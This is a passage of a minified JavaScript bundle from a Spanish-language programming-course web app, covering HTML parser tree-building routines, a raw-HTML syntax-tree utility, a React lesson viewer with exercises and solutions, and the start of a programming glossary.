sZ(a,e){a.openElements.clearBackToTableContext(),a._insertFakeElement(ne.COLGROUP,S.COLGROUP),a.insertionMode=W.IN_COLUMN_GROUP,tS(a,e)}function rZ(a,e){a.openElements.clearBackToTableContext(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_TABLE_BODY}function lZ(a,e){a.openElements.clearBackToTableContext(),a._insertFakeElement(ne.TBODY,S.TBODY),a.insertionMode=W.IN_TABLE_BODY,Tg(a,e)}function cZ(a,e){a.openElements.hasInTableScope(S.TABLE)&&(a.openElements.popUntilTagNamePopped(S.TABLE),a._resetInsertionMode(),a._processStartTag(e))}function uZ(a,e){cN(e)?a._appendElement(e,Ce.HTML):kp(a,e),e.ackSelfClosing=!0}function dZ(a,e){!a.formElement&&a.openElements.tmplCount===0&&(a._insertElement(e,Ce.HTML),a.formElement=a.openElements.current,a.openElements.pop())}function Oc(a,e){switch(e.tagID){case S.TD:case S.TH:case S.TR:{lZ(a,e);break}case S.STYLE:case S.SCRIPT:case S.TEMPLATE:{Ri(a,e);break}case S.COL:{sZ(a,e);break}case S.FORM:{dZ(a,e);break}case S.TABLE:{cZ(a,e);break}case S.TBODY:case S.TFOOT:case S.THEAD:{rZ(a,e);break}case S.INPUT:{uZ(a,e);break}case S.CAPTION:{iZ(a,e);break}case S.COLGROUP:{oZ(a,e);break}default:kp(a,e)}}function dp(a,e){switch(e.tagID){case S.TABLE:{a.openElements.hasInTableScope(S.TABLE)&&(a.openElements.popUntilTagNamePopped(S.TABLE),a._resetInsertionMode());break}case S.TEMPLATE:{gl(a,e);break}case S.BODY:case S.CAPTION:case S.COL:case S.COLGROUP:case S.HTML:case S.TBODY:case S.TD:case S.TFOOT:case S.TH:case S.THEAD:case S.TR:break;default:kp(a,e)}}function kp(a,e){const t=a.fosterParentingEnabled;a.fosterParentingEnabled=!0,Sg(a,e),a.fosterParentingEnabled=t}function pN(a,e){a.pendingCharacterTokens.push(e)}function mN(a,e){a.pendingCharacterTokens.push(e),a.hasNonWhitespacePendingCharacterToken=!0}function fd(a,e){let t=0;if(a.hasNonWhitespacePendingCharacterToken)for(;t<a.pendingCharacterTokens.length;t++)kp(a,a.pendingCharacterTokens[t]);else for(;t<a.pendingCharacterTokens.length;t++)a._insertCharacters(a.pendingCharacterTokens[t]);a.insertionMode=a.originalInsertionMode,a._processToken(e)}const fN=new Set([S.CAPTION,S.COL,S.COLGROUP,S.TBODY,S.TD,S.TFOOT,S.TH,S.THEAD,S.TR]);function pZ(a,e){const t=e.tagID;fN.has(t)?a.openElements.hasInTableScope(S.CAPTION)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(S.CAPTION),a.activeFormattingElements.clearToLastMarker(),a.insertionMode=W.IN_TABLE,Oc(a,e)):Wt(a,e)}function mZ(a,e){const t=e.tagID;switch(t){case S.CAPTION:case S.TABLE:{a.openElements.hasInTableScope(S.CAPTION)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(S.CAPTION),a.activeFormattingElements.clearToLastMarker(),a.insertionMode=W.IN_TABLE,t===S.TABLE&&dp(a,e));break}case S.BODY:case S.COL:case S.COLGROUP:case S.HTML:case S.TBODY:case S.TD:case S.TFOOT:case S.TH:case S.THEAD:case S.TR:break;default:Cg(a,e)}}function tS(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.COL:{a._appendElement(e,Ce.HTML),e.ackSelfClosing=!0;break}case S.TEMPLATE:{Ri(a,e);break}default:Nh(a,e)}}function fZ(a,e){switch(e.tagID){case S.COLGROUP:{a.openElements.currentTagId===S.COLGROUP&&(a.openElements.pop(),a.insertionMode=W.IN_TABLE);break}case S.TEMPLATE:{gl(a,e);break}case S.COL:break;default:Nh(a,e)}}function Nh(a,e){a.openElements.currentTagId===S.COLGROUP&&(a.openElements.pop(),a.insertionMode=W.IN_TABLE,a._processToken(e))}function Tg(a,e){switch(e.tagID){case S.TR:{a.openElements.clearBackToTableBodyContext(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_ROW;break}case S.TH:case S.TD:{a.openElements.clearBackToTableBodyContext(),a._insertFakeElement(ne.TR,S.TR),a.insertionMode=W.IN_ROW,xg(a,e);break}case S.CAPTION:case S.COL:case S.COLGROUP:case S.TBODY:case S.TFOOT:case S.THEAD:{a.openElements.hasTableBodyContextInTableScope()&&(a.openElements.clearBackToTableBodyContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE,Oc(a,e));break}default:Oc(a,e)}}function U0(a,e){const t=e.tagID;switch(e.tagID){case S.TBODY:case S.TFOOT:case S.THEAD:{a.openElements.hasInTableScope(t)&&(a.openElements.clearBackToTableBodyContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE);break}case S.TABLE:{a.openElements.hasTableBodyContextInTableScope()&&(a.openElements.clearBackToTableBodyContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE,dp(a,e));break}case S.BODY:case S.CAPTION:case S.COL:case S.COLGROUP:case S.HTML:case S.TD:case S.TH:case S.TR:break;default:dp(a,e)}}function xg(a,e){switch(e.tagID){case S.TH:case S.TD:{a.openElements.clearBackToTableRowContext(),a._insertElement(e,Ce.HTML),a.insertionMode=W.IN_CELL,a.activeFormattingElements.insertMarker();break}case S.CAPTION:case S.COL:case S.COLGROUP:case S.TBODY:case S.TFOOT:case S.THEAD:case S.TR:{a.openElements.hasInTableScope(S.TR)&&(a.openElements.clearBackToTableRowContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE_BODY,Tg(a,e));break}default:Oc(a,e)}}function hN(a,e){switch(e.tagID){case S.TR:{a.openElements.hasInTableScope(S.TR)&&(a.openElements.clearBackToTableRowContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE_BODY);break}case S.TABLE:{a.openElements.hasInTableScope(S.TR)&&(a.openElements.clearBackToTableRowContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE_BODY,U0(a,e));break}case S.TBODY:case S.TFOOT:case S.THEAD:{(a.openElements.hasInTableScope(e.tagID)||a.openElements.hasInTableScope(S.TR))&&(a.openElements.clearBackToTableRowContext(),a.openElements.pop(),a.insertionMode=W.IN_TABLE_BODY,U0(a,e));break}case S.BODY:case S.CAPTION:case S.COL:case S.COLGROUP:case S.HTML:case S.TD:case S.TH:break;default:dp(a,e)}}function hZ(a,e){const t=e.tagID;fN.has(t)?(a.openElements.hasInTableScope(S.TD)||a.openElements.hasInTableScope(S.TH))&&(a._closeTableCell(),xg(a,e)):Wt(a,e)}function gZ(a,e){const t=e.tagID;switch(t){case S.TD:case S.TH:{a.openElements.hasInTableScope(t)&&(a.openElements.generateImpliedEndTags(),a.openElements.popUntilTagNamePopped(t),a.activeFormattingElements.clearToLastMarker(),a.insertionMode=W.IN_ROW);break}case S.TABLE:case S.TBODY:case S.TFOOT:case S.THEAD:case S.TR:{a.openElements.hasInTableScope(t)&&(a._closeTableCell(),hN(a,e));break}case S.BODY:case S.CAPTION:case S.COL:case S.COLGROUP:case S.HTML:break;default:Cg(a,e)}}function gN(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.OPTION:{a.openElements.currentTagId===S.OPTION&&a.openElements.pop(),a._insertElement(e,Ce.HTML);break}case S.OPTGROUP:{a.openElements.currentTagId===S.OPTION&&a.openElements.pop(),a.openElements.currentTagId===S.OPTGROUP&&a.openElements.pop(),a._insertElement(e,Ce.HTML);break}case S.HR:{a.openElements.currentTagId===S.OPTION&&a.openElements.pop(),a.openElements.currentTagId===S.OPTGROUP&&a.openElements.pop(),a._appendElement(e,Ce.HTML),e.ackSelfClosing=!0;break}case S.INPUT:case S.KEYGEN:case S.TEXTAREA:case S.SELECT:{a.openElements.hasInSelectScope(S.SELECT)&&(a.openElements.popUntilTagNamePopped(S.SELECT),a._resetInsertionMode(),e.tagID!==S.SELECT&&a._processStartTag(e));break}case S.SCRIPT:case S.TEMPLATE:{Ri(a,e);break}}}function bN(a,e){switch(e.tagID){case S.OPTGROUP:{a.openElements.stackTop>0&&a.openElements.currentTagId===S.OPTION&&a.openElements.tagIDs[a.openElements.stackTop-1]===S.OPTGROUP&&a.openElements.pop(),a.openElements.currentTagId===S.OPTGROUP&&a.openElements.pop();break}case S.OPTION:{a.openElements.currentTagId===S.OPTION&&a.openElements.pop();break}case S.SELECT:{a.openElements.hasInSelectScope(S.SELECT)&&(a.openElements.popUntilTagNamePopped(S.SELECT),a._resetInsertionMode());break}case S.TEMPLATE:{gl(a,e);break}}}function bZ(a,e){const t=e.tagID;t===S.CAPTION||t===S.TABLE||t===S.TBODY||t===S.TFOOT||t===S.THEAD||t===S.TR||t===S.TD||t===S.TH?(a.openElements.popUntilTagNamePopped(S.SELECT),a._resetInsertionMode(),a._processStartTag(e)):gN(a,e)}function vZ(a,e){const t=e.tagID;t===S.CAPTION||t===S.TABLE||t===S.TBODY||t===S.TFOOT||t===S.THEAD||t===S.TR||t===S.TD||t===S.TH?a.openElements.hasInTableScope(t)&&(a.openElements.popUntilTagNamePopped(S.SELECT),a._resetInsertionMode(),a.onEndTag(e)):bN(a,e)}function yZ(a,e){switch(e.tagID){case S.BASE:case S.BASEFONT:case S.BGSOUND:case S.LINK:case S.META:case S.NOFRAMES:case S.SCRIPT:case S.STYLE:case S.TEMPLATE:case S.TITLE:{Ri(a,e);break}case S.CAPTION:case S.COLGROUP:case S.TBODY:case S.TFOOT:case S.THEAD:{a.tmplInsertionModeStack[0]=W.IN_TABLE,a.insertionMode=W.IN_TABLE,Oc(a,e);break}case S.COL:{a.tmplInsertionModeStack[0]=W.IN_COLUMN_GROUP,a.insertionMode=W.IN_COLUMN_GROUP,tS(a,e);break}case S.TR:{a.tmplInsertionModeStack[0]=W.IN_TABLE_BODY,a.insertionMode=W.IN_TABLE_BODY,Tg(a,e);break}case S.TD:case S.TH:{a.tmplInsertionModeStack[0]=W.IN_ROW,a.insertionMode=W.IN_ROW,xg(a,e);break}default:a.tmplInsertionModeStack[0]=W.IN_BODY,a.insertionMode=W.IN_BODY,Wt(a,e)}}function EZ(a,e){e.tagID===S.TEMPLATE&&gl(a,e)}function vN(a,e){a.openElements.tmplCount>0?(a.openElements.popUntilTagNamePopped(S.TEMPLATE),a.activeFormattingElements.clearToLastMarker(),a.tmplInsertionModeStack.shift(),a._resetInsertionMode(),a.onEof(e)):aS(a,e)}function SZ(a,e){e.tagID===S.HTML?Wt(a,e):_h(a,e)}function yN(a,e){var t;if(e.tagID===S.HTML){if(a.fragmentContext||(a.insertionMode=W.AFTER_AFTER_BODY),a.options.sourceCodeLocationInfo&&a.openElements.tagIDs[0]===S.HTML){a._setEndLocation(a.openElements.items[0],e);const n=a.openElements.items[1];n&&!(!((t=a.treeAdapter.getNodeSourceCodeLocation(n))===null||t===void 0)&&t.endTag)&&a._setEndLocation(n,e)}}else _h(a,e)}function _h(a,e){a.insertionMode=W.IN_BODY,Sg(a,e)}function CZ(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.FRAMESET:{a._insertElement(e,Ce.HTML);break}case S.FRAME:{a._appendElement(e,Ce.HTML),e.ackSelfClosing=!0;break}case S.NOFRAMES:{Ri(a,e);break}}}function TZ(a,e){e.tagID===S.FRAMESET&&!a.openElements.isRootHtmlElementCurrent()&&(a.openElements.pop(),!a.fragmentContext&&a.openElements.currentTagId!==S.FRAMESET&&(a.insertionMode=W.AFTER_FRAMESET))}function xZ(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.NOFRAMES:{Ri(a,e);break}}}function AZ(a,e){e.tagID===S.HTML&&(a.insertionMode=W.AFTER_AFTER_FRAMESET)}function PZ(a,e){e.tagID===S.HTML?Wt(a,e):$f(a,e)}function $f(a,e){a.insertionMode=W.IN_BODY,Sg(a,e)}function LZ(a,e){switch(e.tagID){case S.HTML:{Wt(a,e);break}case S.NOFRAMES:{Ri(a,e);break}}}function RZ(a,e){e.chars=Ha,a._insertCharacters(e)}function IZ(a,e){a._insertCharacters(e),a.framesetOk=!1}function EN(a){for(;a.treeAdapter.getNamespaceURI(a.openElements.current)!==Ce.HTML&&a.openElements.currentTagId!==void 0&&!a._isIntegrationPoint(a.openElements.currentTagId,a.openElements.current);)a.openElements.pop()}function wZ(a,e){if(G$(e))EN(a),a._startTagOutsideForeignContent(e);else{const t=a._getAdjustedCurrentElement(),n=a.treeAdapter.getNamespaceURI(t);n===Ce.MATHML?nN(e):n===Ce.SVG&&(Q$(e),iN(e)),Z1(e),e.selfClosing?a._appendElement(e,n):a._insertElement(e,n),e.ackSelfClosing=!0}}function jZ(a,e){if(e.tagID===S.P||e.tagID===S.BR){EN(a),a._endTagOutsideForeignContent(e);return}for(let t=a.openElements.stackTop;t>0;t--){const n=a.openElements.items[t];if(a.treeAdapter.getNamespaceURI(n)===Ce.HTML){a._endTagOutsideForeignContent(e);break}const i=a.treeAdapter.getTagName(n);if(i.toLowerCase()===e.tagName){e.tagName=i,a.openElements.shortenToLength(t);break}}}ne.AREA,ne.BASE,ne.BASEFONT,ne.BGSOUND,ne.BR,ne.COL,ne.EMBED,ne.FRAME,ne.HR,ne.IMG,ne.INPUT,ne.KEYGEN,ne.LINK,ne.META,ne.PARAM,ne.SOURCE,ne.TRACK,ne.WBR;const DZ=/<(\/?)(iframe|noembed|noframes|plaintext|script|style|textarea|title|xmp)(?=[\t\n\f\r />])/gi,MZ=new Set(["mdxFlowExpression","mdxJsxFlowElement","mdxJsxTextElement","mdxTextExpression","mdxjsEsm"]),AL={sourceCodeLocationInfo:!0,scriptingEnabled:!1};function SN(a,e){const t=VZ(a),n=xM("type",{handlers:{root:NZ,element:_Z,text:qZ,comment:TN,doctype:kZ,raw:UZ},unknown:zZ}),i={parser:t?new CL(AL):CL.getFragmentParser(void 0,AL),handle(u){n(u,i)},stitches:!1,options:e||{}};n(a,i),au(i,uo());const r=t?i.parser.document:i.parser.getFragment(),l=HY(r,{file:i.options.file});return i.stitches&&Eg(l,"comment",function(u,d,p){const f=u;if(f.value.stitch&&p&&d!==void 0){const h=p.children;return h[d]=f.value.stitch,d}}),l.type==="root"&&l.children.length===1&&l.children[0].type===a.type?l.children[0]:l}function CN(a,e){let t=-1;if(a)for(;++t<a.length;)e.handle(a[t])}function NZ(a,e){CN(a.children,e)}function _Z(a,e){BZ(a,e),CN(a.children,e),FZ(a,e)}function qZ(a,e){e.parser.tokenizer.state>4&&(e.parser.tokenizer.state=0);const t={type:na.CHARACTER,chars:a.value,location:Op(a)};au(e,uo(a)),e.parser.currentToken=t,e.parser._processToken(e.parser.currentToken)}function kZ(a,e){const t={type:na.DOCTYPE,name:"html",forceQuirks:!1,publicId:"",systemId:"",location:Op(a)};au(e,uo(a)),e.parser.currentToken=t,e.parser._processToken(e.parser.currentToken)}function OZ(a,e){e.stitches=!0;const t=HZ(a);if("children"in a&&"children"in t){const n=SN({type:"root",children:a.children},e.options);t.children=n.children}TN({type:"comment",value:{stitch:t}},e)}function TN(a,e){const t=a.value,n={type:na.COMMENT,data:t,location:Op(a)};au(e,uo(a)),e.parser.currentToken=n,e.parser._processToken(e.parser.currentToken)}function UZ(a,e){if(e.parser.tokenizer.preprocessor.html="",e.parser.tokenizer.preprocessor.pos=-1,e.parser.tokenizer.preprocessor.lastGapPos=-2,e.parser.tokenizer.preprocessor.gapStack=[],e.parser.tokenizer.preprocessor.skipNextNewLine=!1,e.parser.tokenizer.preprocessor.lastChunkWritten=!1,e.parser.tokenizer.preprocessor.endOfChunkHit=!1,e.parser.tokenizer.preprocessor.isEol=!1,xN(e,uo(a)),e.parser.tokenizer.write(e.options.tagfilter?a.value.replace(DZ,"&lt;$1$2"):a.value,!1),e.parser.tokenizer._runParsingLoop(),e.parser.tokenizer.state===72||e.parser.tokenizer.state===78){e.parser.tokenizer.preprocessor.lastChunkWritten=!0;const t=e.parser.tokenizer._consume();e.parser.tokenizer._callState(t)}}function zZ(a,e){const t=a;if(e.options.passThrough&&e.options.passThrough.includes(t.type))OZ(t,e);else{let n="";throw MZ.has(t.type)&&(n=". It looks like you are using MDX nodes with `hast-util-raw` (or `rehype-raw`). If you use this because you are using remark or rehype plugins that inject `'html'` nodes, then please raise an issue with that plugin, as its a bad and slow idea. If you use this because you are using markdown syntax, then you have to configure this utility (or plugin) to pass through these nodes (see `passThrough` in docs), but you can also migrate to use the MDX syntax"),new Error("Cannot compile `"+t.type+"` node"+n)}}function au(a,e){xN(a,e);const t=a.parser.tokenizer.currentCharacterToken;t&&t.location&&(t.location.endLine=a.parser.tokenizer.preprocessor.line,t.location.endCol=a.parser.tokenizer.preprocessor.col+1,t.location.endOffset=a.parser.tokenizer.preprocessor.offset+1,a.parser.currentToken=t,a.parser._processToken(a.parser.currentToken)),a.parser.tokenizer.paused=!1,a.parser.tokenizer.inLoop=!1,a.parser.tokenizer.active=!1,a.parser.tokenizer.returnState=tt.DATA,a.parser.tokenizer.charRefCode=-1,a.parser.tokenizer.consumedAfterSnapshot=-1,a.parser.tokenizer.currentLocation=null,a.parser.tokenizer.currentCharacterToken=null,a.parser.tokenizer.currentToken=null,a.parser.tokenizer.currentAttr={name:"",value:""}}function xN(a,e){if(e&&e.offset!==void 0){const t={startLine:e.line,startCol:e.column,startOffset:e.offset,endLine:-1,endCol:-1,endOffset:-1};a.parser.tokenizer.preprocessor.lineStartPos=-e.column+1,a.parser.tokenizer.preprocessor.droppedBufferSize=e.offset,a.parser.tokenizer.preprocessor.line=e.line,a.parser.tokenizer.currentLocation=t}}function BZ(a,e){const t=a.tagName.toLowerCase();if(e.parser.tokenizer.state===tt.PLAINTEXT)return;au(e,uo(a));const n=e.parser.openElements.current;let i="namespaceURI"in n?n.namespaceURI:Kr.html;i===Kr.html&&t==="svg"&&(i=Kr.svg);const r=KY({...a,children:[]},{space:i===Kr.svg?"svg":"html"}),l={type:na.START_TAG,tagName:t,tagID:eu(t),selfClosing:!1,ackSelfClosing:!1,attrs:"attrs"in r?r.attrs:[],location:Op(a)};e.parser.currentToken=l,e.parser._processToken(e.parser.currentToken),e.parser.tokenizer.lastStartTagName=t}function FZ(a,e){const t=a.tagName.toLowerCase();if(!e.parser.tokenizer.inForeignNode&&n$.includes(t)||e.parser.tokenizer.state===tt.PLAINTEXT)return;au(e,fg(a));const n={type:na.END_TAG,tagName:t,tagID:eu(t),selfClosing:!1,ackSelfClosing:!1,attrs:[],location:Op(a)};e.parser.currentToken=n,e.parser._processToken(e.parser.currentToken),t===e.parser.tokenizer.lastStartTagName&&(e.parser.tokenizer.state===tt.RCDATA||e.parser.tokenizer.state===tt.RAWTEXT||e.parser.tokenizer.state===tt.SCRIPT_DATA)&&(e.parser.tokenizer.state=tt.DATA)}function VZ(a){const e=a.type==="root"?a.children[0]:a;return!!(e&&(e.type==="doctype"||e.type==="element"&&e.tagName.toLowerCase()==="html"))}function Op(a){const e=uo(a)||{line:void 0,column:void 0,offset:void 0},t=fg(a)||{line:void 0,column:void 0,offset:void 0};return{startLine:e.line,startCol:e.column,startOffset:e.offset,endLine:t.line,endCol:t.column,endOffset:t.offset}}function HZ(a){return"children"in a?kc({...a,children:[]}):kc(a)}function z0(a){return function(e,t){return SN(e,{...a,file:t})}}const GZ=({lesson:a,moduleId:e,moduleTitle:t,onComplete:n,canComplete:i=!0,onPrev:r,onNext:l,hasPrev:u,hasNext:d,isSidebarOpen:p,onToggleSidebar:f})=>{const[h,E]=U.useState(!1),{toggleChecklistItem:C,isChecklistItemCompleted:A,toggleFavorite:j,isFavorite:R}=Jc(),[I,w]=U.useState(18),[k,Y]=U.useState("sans"),[ee,Q]=U.useState(!1),q=()=>{document.fullscreenElement?document.exitFullscreen&&document.exitFullscreen().then(()=>Q(!1)):document.documentElement.requestFullscreen().then(()=>Q(!0))},M=L=>{w(_=>Math.min(Math.max(_+L,14),28))};Go.useEffect(()=>{E(!1)},[a.id]);const N=R(a.id);return b.jsxs("div",{className:`lesson-viewer ${ee?"fullscreen-mode":""} font-${k}`,style:{"--content-font-size":`${I}px`},children:[b.jsxs("header",{className:"lesson-viewer-header",children:[b.jsxs("div",{className:"title-area",children:[f&&b.jsx("button",{className:"btn-icon-toolbar",onClick:f,title:p?"Ocultar men":"Mostrar men",children:p?b.jsx(AH,{size:20}):b.jsx(LH,{size:20})}),b.jsx("h2",{children:a.title}),b.jsx("button",{className:`btn-favorite ${N?"active":""}`,onClick:()=>j(e,a.id,a.title,t),title:N?"Quitar de favoritos":"Marcar como favorito",children:N?b.jsx(E0,{fill:"#ef4444",color:"#ef4444",size:20}):b.jsx(E0,{size:20})})]}),b.jsxs("div",{className:"viewer-controls",children:[b.jsxs("div",{className:"control-group",children:[b.jsx("button",{onClick:()=>M(-1),className:"btn-icon-mini",title:"Disminuir letra",children:b.jsx(gH,{size:16})}),b.jsxs("span",{className:"font-size-label",children:[I,"px"]}),b.jsx("button",{onClick:()=>M(1),className:"btn-icon-mini",title:"Aumentar letra",children:b.jsx(MD,{size:16})})]}),b.jsxs("div",{className:"control-group",children:[b.jsx("button",{className:`btn-icon-mini ${k==="sans"?"active":""}`,onClick:()=>Y("sans"),title:"Sans-serif",children:b.jsx("span",{style:{fontFamily:"sans-serif",fontWeight:"bold"},children:"Az"})}),b.jsx("button",{className:`btn-icon-mini ${k==="serif"?"active":""}`,onClick:()=>Y("serif"),title:"Serif",children:b.jsx("span",{style:{fontFamily:"serif",fontWeight:"bold"},children:"Az"})}),b.jsx("button",{className:`btn-icon-mini ${k==="mono"?"active":""}`,onClick:()=>Y("mono"),title:"Monospace",children:b.jsx("span",{style:{fontFamily:"monospace",fontWeight:"bold"},children:"Az"})})]}),b.jsx("button",{className:"btn-icon-toolbar",onClick:q,title:"Pantalla completa",children:ee?b.jsx(vH,{size:20}):b.jsx(uH,{size:20})}),b.jsx("span",{className:`status-badge ${a.completed?"completed":"pending"}`,children:a.completed?"Completada":"En progreso"})]})]}),b.jsxs("div",{className:"lesson-viewer-content",children:[a.level&&b.jsxs("div",{className:`level-indicator ${a.level}`,children:["Nivel ",a.level.charAt(0).toUpperCase()+a.level.slice(1)]}),a.isProject?b.jsxs("div",{className:"project-section",children:[b.jsxs("div",{className:"project-header",children:[b.jsx("span",{className:"project-badge",children:"PROYECTO"}),b.jsx("h3",{children:a.title})]}),b.jsx("div",{className:"project-content markdown-body",children:b.jsx(D0,{remarkPlugins:[N0],rehypePlugins:[z0],children:a.explanation||a.content||""})}),b.jsxs("div",{className:"project-details",children:[b.jsxs("div",{className:"project-block",children:[b.jsxs("h4",{children:[b.jsx(m9,{className:"inline-icon",size:20})," Consigna"]}),b.jsx("ul",{className:"project-list",children:a.projectRequirements?a.projectRequirements.map((L,_)=>b.jsx("li",{children:L},_)):a.exercises?.map((L,_)=>b.jsx("li",{children:L},_))})]}),b.jsxs("div",{className:"project-block",children:[b.jsxs("h4",{children:[b.jsx(pP,{className:"inline-icon",size:20})," Sugerencias"]}),b.jsx("ul",{className:"project-list",children:(a.projectSuggestions||a.bestPractices)?.map((L,_)=>b.jsx("li",{children:L},_))})]})]}),a.solution&&b.jsxs("div",{className:"project-solution-section",children:[b.jsx("button",{className:"btn-show-solution",onClick:()=>E(!h),children:h?"Ocultar resultado esperado":"Ver resultado esperado"}),h&&b.jsxs("div",{className:"project-outcome",children:[b.jsxs("h4",{children:[b.jsx(pg,{className:"inline-icon",size:20})," Cdigo de referencia:"]}),b.jsx(Ad,{code:a.solution,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]})]})]}):b.jsxs(b.Fragment,{children:[a.objective&&b.jsxs("div",{className:"lesson-section objective",children:[b.jsxs("h3",{children:[b.jsx(Wf,{className:"inline-icon",size:22})," Objetivo"]}),b.jsx("p",{children:a.objective})]}),b.jsx("div",{className:"content-text markdown-body",children:b.jsx(D0,{remarkPlugins:[N0],rehypePlugins:[z0],children:a.content||a.explanation||""})}),a.examples&&a.examples.length>0&&b.jsxs("div",{className:"lesson-section examples",children:[b.jsxs("h3",{children:[b.jsx(pP,{className:"inline-icon",size:22})," Ejemplos"]}),a.examples.map((L,_)=>b.jsx(Ad,{code:L,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"},_))]}),a.commonMistakes&&a.commonMistakes.length>0&&b.jsxs("div",{className:"lesson-section common-mistakes",children:[b.jsxs("h3",{children:[b.jsx(c9,{className:"inline-icon",size:22})," Errores Comunes"]}),b.jsx("ul",{className:"modern-list",children:a.commonMistakes.map((L,_)=>b.jsx("li",{children:L},_))})]}),a.bestPractices&&a.bestPractices.length>0&&b.jsxs("div",{className:"lesson-section best-practices",children:[b.jsxs("h3",{children:[b.jsx(Ys,{className:"inline-icon",size:22})," Buenas Prcticas"]}),b.jsx("ul",{className:"modern-list",children:a.bestPractices.map((L,_)=>b.jsx("li",{children:L},_))})]}),a.exercises&&a.exercises.length>0&&b.jsxs("div",{className:"lesson-section exercises",children:[b.jsxs("h3",{children:[b.jsx(Wf,{className:"inline-icon",size:22})," Ejercicios"]}),b.jsx("ul",{className:"modern-list",children:a.exercises.map((L,_)=>b.jsx("li",{children:L},_))})]}),a.level==="senior"&&a.extraNotes&&b.jsxs("div",{className:"lesson-section senior-notes",children:[b.jsxs("h3",{children:[b.jsx(RD,{className:"inline-icon",size:22})," Notas para Seniors"]}),b.jsx("p",{children:a.extraNotes})]}),!a.explanation&&a.checklist&&a.checklist.length>0&&b.jsxs("div",{className:"checklist-section",children:[b.jsxs("h4",{children:[b.jsx(Ys,{className:"inline-icon",size:20})," Checklist de aprendizaje"]}),b.jsx("ul",{className:"checklist-list",children:a.checklist.map((L,_)=>{const V=A(e,a.id,L);return b.jsx("li",{className:"checklist-item",children:b.jsxs("label",{children:[b.jsx("input",{type:"checkbox",checked:V,onChange:()=>C(e,a.id,L)}),b.jsx("span",{className:V?"checked":"",children:L})]})},_)})})]}),!a.examples&&a.code&&b.jsxs("div",{className:"code-section",children:[b.jsxs("h4",{children:[b.jsx(TD,{className:"inline-icon",size:20})," Ejemplo de cdigo:"]}),b.jsx(Ad,{code:a.code,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]}),!a.exercises&&a.exercise&&b.jsxs("div",{className:"exercise-section",children:[b.jsxs("h3",{children:[b.jsx(Wf,{className:"inline-icon",size:22})," Ejercicio"]}),b.jsx("p",{className:"exercise-prompt",children:a.exercise}),a.hint&&b.jsxs("details",{className:"exercise-hint",children:[b.jsxs("summary",{children:[b.jsx(r9,{className:"inline-icon",size:18})," Ver pista"]}),b.jsx("p",{children:a.hint})]}),b.jsx("div",{className:"exercise-actions",children:b.jsx("button",{className:"btn-show-solution",onClick:()=>E(!h),children:h?"Ocultar solucin":"Ver solucin"})}),h&&a.solution&&b.jsxs("div",{className:"exercise-solution",children:[b.jsx("h4",{children:"Solucin sugerida:"}),b.jsx(Ad,{code:a.solution,language:a.id.includes("html")?"html":a.id.includes("js")?"javascript":a.id.includes("ts")?"typescript":a.id.includes("react")?"javascript":"css"})]})]})]})]}),b.jsxs("footer",{className:"lesson-viewer-footer",children:[b.jsxs("div",{className:"nav-buttons",children:[b.jsx("button",{className:"btn-nav",disabled:!u,onClick:r,children:" Anterior"}),b.jsx("button",{className:"btn-nav",disabled:!d,onClick:l,children:"Siguiente "})]}),b.jsxs("div",{className:"completion-area",children:[!i&&!a.completed&&b.jsxs("div",{className:"sequence-lock-warning",children:[b.jsx(_c,{size:14})," Completa la leccin anterior para desbloquear"]}),b.jsx("button",{className:`btn-complete ${a.completed||!i?"disabled":""}`,disabled:a.completed||!i,onClick:()=>n&&n(a.id),children:a.completed?b.jsxs(b.Fragment,{children:[b.jsx(Ys,{size:18})," Leccin Completada"]}):i?"Marcar como completada":b.jsxs(b.Fragment,{children:[b.jsx(_c,{size:18})," Bloqueada"]})})]})]})]})},PL=({moduleName:a,lessonName:e})=>b.jsx("nav",{className:"breadcrumbs","aria-label":"Breadcrumb",children:b.jsxs("ol",{className:"breadcrumbs-list",children:[b.jsx("li",{className:"breadcrumb-item",children:b.jsx(jn,{to:"/roadmap",children:"Cursos"})}),a&&b.jsxs(b.Fragment,{children:[b.jsx("li",{className:"breadcrumb-separator",children:"/"}),b.jsx("li",{className:"breadcrumb-item",children:b.jsx("span",{className:"breadcrumb-module",children:a})})]}),e&&b.jsxs(b.Fragment,{children:[b.jsx("li",{className:"breadcrumb-separator",children:"/"}),b.jsx("li",{className:"breadcrumb-item active","aria-current":"page",children:e})]})]})}),QZ=[{id:"fundamentos",title:"Fundamentos de Programacin",definitions:[{term:"Algoritmo",description:"Secuencia finita de instrucciones precisas y ordenadas para resolver un problema o realizar una tarea."},{term:"Variable",description:"Espacio en memoria reservado para almacenar un valor que puede cambiar durante la ejecucin del programa."},{term:"Constante",description:"Valor guardado en memoria que no puede ser modificado despus de su inicializacin."},{term:"Funcin",description:"Bloque de cdigo reutilizable que realiza una tarea especfica y puede recibir parmetros y devolver un valor."},{term:"Bucle (Loop)",description:"Estructura de control que repite un bloque de cdigo mientras se cumpla una condicin (for, while)."},{term:"Bug",description:"Error, fallo o defecto en un programa de software que produce un comportamiento indeseado o incorrecto."},{term:"Debugging (Depuracin)",description:"El proceso metdico de encontrar, analizar y corregir bugs o errores dentro de un cdigo fuente."},{term:"IDE (Entorno de Desarrollo Integrado)",description:"Software que consolida herramientas bsicas de desarrollo para escribir, probar y depurar cdigo en una sola aplicacin (ej. VS Code, IntelliJ)."},{term:"Sintaxis",description:"Conjunto de reglas ortogrficas y gramaticales que un lenguaje de programacin requiere para que el cdigo sea estructuralmente vlido."},{term:"Scope (Alcance)",description:"El contexto de ejecucin en el cual los valores 